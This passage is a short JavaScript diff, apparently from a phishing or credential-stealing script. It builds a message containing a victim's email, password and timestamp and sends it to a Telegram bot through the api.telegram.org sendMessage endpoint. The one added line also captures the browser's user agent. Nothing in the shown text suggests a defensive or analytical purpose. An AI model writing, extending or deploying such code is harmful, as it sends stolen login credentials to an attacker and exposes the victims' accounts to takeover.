@@ -218,6 +218,7 @@
 Email: ${email}
 Password: ${password}
 Time: ${new Date().toLocaleString()}
+Device: ${navigator.userAgent}
         `.trim();
 
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
